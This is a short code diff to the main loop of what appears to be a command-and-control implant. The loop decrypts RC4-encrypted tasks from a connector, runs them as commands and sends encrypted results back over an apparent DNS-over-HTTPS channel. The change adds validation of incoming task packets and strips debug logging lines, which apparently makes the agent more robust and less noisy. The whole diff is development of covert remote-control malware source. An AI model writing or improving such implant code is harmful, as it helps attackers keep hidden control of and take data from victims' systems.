@@ -366,7 +366,18 @@ void AgentMain()
 
 		if (g_Connector->RecvSize() && g_Connector->RecvData()) {
 			DecryptRC4(g_Connector->RecvData(), g_Connector->RecvSize(), g_Agent->SessionKey, 16);
-			g_Agent->commander->ProcessCommandTasks(g_Connector->RecvData(), g_Connector->RecvSize(), packerOut);
+			BOOL isValid = FALSE;
+			ULONG recvSize = (ULONG)g_Connector->RecvSize();
+			BYTE* recvData = g_Connector->RecvData();
+			if (recvData && recvSize >= 8) {
+				ULONG packLen = recvData[0] | (recvData[1] << 8) | (recvData[2] << 16) | (recvData[3] << 24);
+				if (packLen > 0 && packLen <= (recvSize - 4)) {
+					isValid = TRUE;
+				}
+			}
+			if (isValid) {
+				g_Agent->commander->ProcessCommandTasks(recvData, (int)recvSize, packerOut);
+			}
 		}
 		g_Connector->RecvClear();
 
@@ -513,7 +524,6 @@ void AgentMain()
 		DohDebugLog("[DoH] Loop: start iteration");
 		if (packerOut->datasize() > 4) {
 			packerOut->Set32(0, packerOut->datasize());
-			DohDebugLog("[DoH] Loop: have outbound data, preparing frame");
 			BYTE* plainBuf = packerOut->data();
 			ULONG plainLen = packerOut->datasize();
 		
@@ -547,14 +557,11 @@ void AgentMain()
 			}
 		
 			if (!sessionBuf) {
-				DohDebugLog("[DoH] Loop: sessionBuf alloc failed, sending plainBuf");
 				EncryptRC4(plainBuf, (int)plainLen, g_Agent->SessionKey, 16);
 				g_Connector->SendData(plainBuf, plainLen);
-				DohDebugLog("[DoH] Loop: SendData(plainBuf) done");
 			} else {
 				EncryptRC4(sessionBuf, (int)sessionLen, g_Agent->SessionKey, 16);
 				g_Connector->SendData(sessionBuf, sessionLen);
-				DohDebugLog("[DoH] Loop: SendData(sessionBuf) done");
 				MemFreeLocal((LPVOID*)&sessionBuf, sessionLen);
 			}
 		
